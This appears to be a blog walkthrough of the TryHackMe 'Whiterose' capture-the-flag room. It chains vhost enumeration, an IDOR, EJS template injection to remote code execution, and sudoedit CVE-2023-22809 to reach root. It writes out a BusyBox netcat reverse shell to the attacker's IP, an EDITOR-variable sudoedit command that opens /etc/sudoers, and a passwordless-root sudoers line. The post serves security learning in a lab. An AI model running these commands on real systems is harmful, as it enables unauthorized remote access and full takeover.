> Yet another Mr. Robot themed challenge.

In this Capture The Flag (CTF) walkthrough, we explore the “Whiterose” challenge on TryHackMe, inspired by the _Mr. Robot_ TV series. This room tests our ability to perform reconnaissance, identify web-based vulnerabilities, and exploit insecure configurations to gain full system access. We begin by enumerating virtual hosts to uncover a hidden admin portal, exploit an Insecure Direct Object Reference (IDOR) vulnerability to escalate access, and discover a Server-Side Template Injection (SSTI) flaw in an EJS-powered page to achieve Remote Code Execution (RCE). Finally, we exploit a vulnerability in `sudoedit` (CVE-2023–22809) to escalate privileges and capture the root flag.

Room Link: [https://tryhackme.com/room/whiterose](https://tryhackme.com/room/whiterose)

# Scenario

![](https://miro.medium.com/v2/resize:fit:656/1*3HiWXSSnMJj-4KZLy_LIlw.png)

**Question 1**

![](https://miro.medium.com/v2/resize:fit:315/1*6zCu5TXwl5WRlvHVvMeonQ.png)

**Question 2**

![](https://miro.medium.com/v2/resize:fit:199/1*xhFKY3hpIN764b4XYe16TQ.png)

**Question 3**

![](https://miro.medium.com/v2/resize:fit:199/1*dlbIQyQxzEHX0xucjvLhiQ.png)

# Reconnaissance

Start the machine and collect the “Target IP Address” to begin the scan.

![](https://miro.medium.com/v2/resize:fit:788/1*ToG2hzmqi7IojulZ3agCYw.png)

To get an overview of the open ports on the target system, I performed a full Nmap scan using the following command:

sudo nmap -A -vv -T4 -n 10.10.47.194

The Nmap scan revealed two open ports: port 22 (SSH) and port 80 (HTTP). I decided to focus on port 80 and explored the HTTP service further.

![](https://miro.medium.com/v2/resize:fit:788/1*0TQGvB4mOR_xXlQOBA3d7A.png)

I navigated to `cyprusbank.thm`, but first, I had to edit the `/etc/hosts` file to resolve the domain locally.

![](https://miro.medium.com/v2/resize:fit:221/1*NH_NPtSiMBh15za10Cq0Hg.png)

![](https://miro.medium.com/v2/resize:fit:642/1*5hl7I2AmMek3v1PAD_7Hmw.png)

Once I accessed the site, it displayed a “National Bank of Cyprus” page, which mentioned that the site was under maintenance.

![](https://miro.medium.com/v2/resize:fit:788/1*bt2XNgWAfVwhRjOEuox0Rg.png)

# Enumeration

At first, I considered performing directory enumeration using [**Dirsearch**](https://github.com/maurosoria/dirsearch), but it didn’t yield any interesting results.

![](https://miro.medium.com/v2/resize:fit:599/1*iS78tc9sj1c2zrgQ1YpaZQ.png)

Next, I switched to enumerating virtual hosts using **FFUF**.

![](https://miro.medium.com/v2/resize:fit:788/1*kcJPSt-65_OHsq-QXBN9dQ.png)

The output from FFUF showed multiple results, but two in particular stood out based on the response sizes:

- `www` returned 252 bytes,
- `admin` returned only 28 bytes.

![](https://miro.medium.com/v2/resize:fit:788/1*Jl3qpPJaLRqEL-qa-BBXKQ.png)

I added both the `www` and `admin` virtual hosts to the `/etc/hosts` file to resolve them locally.

![](https://miro.medium.com/v2/resize:fit:788/1*eVGfIvpjHU9fgbg11nAIrA.png)

Then, I navigated to `admin.cyprusbank.thm` and was greeted with a login page.

![](https://miro.medium.com/v2/resize:fit:788/1*TZjQ7h62VXslZqzqvU06iQ.png)

# Exploiting Insecure Direct Object Reference (IDOR)

I recalled that the author had provided Olivia Cortez’s login credentials, so I used them to log in.

![](https://miro.medium.com/v2/resize:fit:360/1*ZaVu8LYL7tMEETv5c63xlQ.png)

Once logged in, I was presented with four pages: Home, Search, Settings, and Messages. The Home page showed recent payments and account information.

![](https://miro.medium.com/v2/resize:fit:788/1*vly2Zl4kEU033CqYchFjNA.png)

I navigated to the **Search** page to answer the first question: “What is Tyrell Wellick’s phone number?” However, the phone number was redacted.

![](https://miro.medium.com/v2/resize:fit:788/1*CPGiIBtQ_8NXeThIcOL8zQ.png)

Then, I attempted to access the **Settings** page, but I was denied access, with a message indicating insufficient permissions.

![](https://miro.medium.com/v2/resize:fit:788/1*xbVlln9fFXWT03E9zPLOeA.png)

Lastly, I visited the **Messages** page and noticed a parameter `?c=5` in the URL. This raised my suspicion of an Insecure Direct Object Reference (IDOR) vulnerability, where manipulating the value of `c` could potentially expose other data.

![](https://miro.medium.com/v2/resize:fit:788/1*tJjI-OdOeV4JyJM2rhCWtA.png)

I changed the value of `c` to `0` and was able to access a message from "Gayle Bev", which contained their password. This confirmed the presence of an IDOR vulnerability, as I was able to access sensitive information by simply modifying the URL parameter.

![](https://miro.medium.com/v2/resize:fit:788/1*VWKHuhQXOtM8h7EivWPUUQ.png)

Using the credentials from Gayle Bev’s message, I logged in and successfully accessed their account.

![](https://miro.medium.com/v2/resize:fit:550/1*210XfBDrfpfvikzflDaxbQ.png)

On the homepage, I was able to answer the first question, as this account had permission to view the phone number.

![](https://miro.medium.com/v2/resize:fit:788/1*YLEH5sUHUHYRJPiSL1YShA.png)

# Exploiting EJS Server-Side Template Injection (SSTI)

After gaining access to the account, I navigated to the **Settings** page, which required two fields: a username and a new password.  
I suspected that this page might allow password changes, so I tested it by inputting “Test” as the username and “Test” as the new password.

![](https://miro.medium.com/v2/resize:fit:788/1*JyO5T3tXKWtnQi2xUDugkA.png)

To my surprise, the new password was reflected in the notifications confirming the password update.

![](https://miro.medium.com/v2/resize:fit:788/1*OHMkJB3rRlL7FbtAtnCplA.png)

Initially, I considered testing for **reflected XSS**, but that didn’t work.

I then used **Burp Suite** to capture the POST request and found that it required both the username and password fields.

![](https://miro.medium.com/v2/resize:fit:788/1*q-TcBapR7ev2n8kVvJCSGg.png)

When I deleted the password field, an error message appeared that contained `.ejs` — a strong indication that the application was using **Embedded JavaScript (EJS)** templates for rendering views. This led me to suspect a potential **Server-Side Template Injection (SSTI)** vulnerability.

![](https://miro.medium.com/v2/resize:fit:788/1*Ekoa2yw_o7TmiPWWiGsHTQ.png)

After researching, I found a GitHub page detailing an unpatched **SSTI** vulnerability in **EJS** version 3.1.9, which can lead to remote code execution (RCE) if exploited.

[

## EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) · Issue #735 · mde/ejs

### EJS has a server-side template injection vulnerability. You have fixed some server-side template injection…

github.com



](https://github.com/mde/ejs/issues/735?source=post_page-----8c4434fd3e5b---------------------------------------)

Using a payload like the following allowed me to execute commands on the server:

![](https://miro.medium.com/v2/resize:fit:788/1*Pp8gihqtyLlAN4TYUuOmUA.png)

With this in place, I executed the `id` command, which returned the user information, confirming my ability to execute commands on the server.

![](https://miro.medium.com/v2/resize:fit:788/1*Ll-rMuzTAPOYehiNMNAIYA.png)

To further escalate, I used a **BusyBox** reverse shell payload from [**revshells.com**](https://www.revshells.com/):

busybox nc 10.4.61.251 4444 -e bash

![](https://miro.medium.com/v2/resize:fit:788/1*GBOtdcw5qyBGvav_BzFjAQ.png)

Setting up a **Netcat listener** on my machine, I received the reverse shell and navigated to the home directory, where I found the `user.txt` file containing the flag.

![](https://miro.medium.com/v2/resize:fit:696/1*KCpXYjJ3ER40zKj4k1dkNg.png)

To stabilize the shell, I upgraded it to a more interactive one by using Python.

![](https://miro.medium.com/v2/resize:fit:788/1*KRaZNQMJybaS1hRrMIGUzg.png)

# Exploiting **CVE-2023–22809 for Privilege Escalation**

After obtaining access to the system, my first action was to check which commands I could run with **sudo** using the following command:

sudo -l

This revealed a critical piece of information: the user had **NOPASSWD** privileges for a specific command. The output indicated:

(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

![](https://miro.medium.com/v2/resize:fit:788/1*ibMkbS623ywWDBsv5CtnYQ.png)

This means the user could run the `sudoedit` command on the file `/etc/nginx/sites-available/admin.cyprusbank.thm` with root privileges, **without requiring a password**.  
The `sudoedit` command is typically used to edit files with root privileges in a safer manner (e.g., using `nano` or `vim`), but the presence of the **NOPASSWD** directive creates a security risk. This allows the user to potentially modify critical system files without authentication.

After doing some research, I came across an article by [**Synacktiv**](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf) explaining **CVE-2023–22809**, a vulnerability in **sudoedit**. This vulnerability allows an attacker with access to the `sudoedit` command, especially with **NOPASSWD** privileges, to escalate their privileges and execute arbitrary commands as root.

![](https://miro.medium.com/v2/resize:fit:788/1*Lv2dnpM9D8wnObu_-NHQXA.png)

Next, I checked the version of **sudo** on the system, which turned out to be **1.9.12**. This version is vulnerable to **CVE-2023–22809**.

![](https://miro.medium.com/v2/resize:fit:459/1*gmPSYVlb6G7w4myhMQcJfQ.png)

To exploit this, I used the following command to edit the **sudoers** file indirectly through the `sudoedit` command:

EDITOR="nano -- /etc/sudoers" sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

In this command, I specified `nano` as the editor to be used by **sudoedit**, along with the argument `--` to ensure **nano** treats `/etc/sudoers` as a normal file. The `--` is important because without it, **nano** might treat the path as a directory, leading to unintended behavior. **sudoedit** allows users to edit files that require elevated privileges by temporarily setting up a safe editing environment, and it will open the specified file in the editor with the user's sudo privileges.

By setting the `EDITOR` variable to **nano**, I instructed **sudoedit** to use **nano** to open the file `/etc/sudoers`. This gave me the ability to modify system-critical files, such as the sudoers file, even though direct access to those files would usually be restricted.

Then i execute the command:

sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

After executing the command, it opened the `/etc/sudoers` file in **nano**. In this file, I added a line to grant elevated privileges to the **web** group. Specifically, I modified the sudoers configuration to allow users in the **web** group to execute any command as any user, with no password prompt. The line I added looked like this:

web ALL=(ALL:ALL) NOPASSWD: ALL

![](https://miro.medium.com/v2/resize:fit:788/1*Ufczp5RP9U18edXSjwgfww.png)

Finally, after modifying the sudoers file and granting the **web** group passwordless sudo access, I executed the following command to switch to the root user:

sudo su

![](https://miro.medium.com/v2/resize:fit:300/1*KFB_CE0CpbrPFTRbfcdhnw.png)

Finally, i successfully captured the final flag!

![](https://miro.medium.com/v2/resize:fit:401/1*uBQeANPIZZ_gJWW8XhZ-Iw.png)

# Conclusion

This writeup highlights the importance of proper configuration of privileges, especially when dealing with **sudo** and sensitive configuration files. The exploitation of **IDOR**, **SSTI**, and **CVE-2023–22809** demonstrates how small misconfigurations and vulnerabilities can lead to significant security risks and privilege escalation.